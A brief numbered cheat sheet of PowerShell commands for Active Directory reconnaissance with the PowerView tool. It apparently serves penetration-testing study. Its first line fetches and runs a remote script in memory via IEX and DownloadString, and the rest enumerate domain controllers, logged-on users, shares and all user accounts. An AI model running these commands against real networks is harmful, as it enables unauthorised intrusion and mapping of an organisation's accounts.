1. Use IEX to load the module - IEX(New-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1")
2. Enumerate the domain controllers - Get-NetDomainControllers
3. Enumerate the current logd in users - Get-NetLoggedOn
4. Enumerate the OUs in the domain - Get-NetOU
5. Display all shares on a server - Get-NetShare
6. Display domain's name and forest - Get-NetDomain
7. Display all user Objects - Get-NetUser 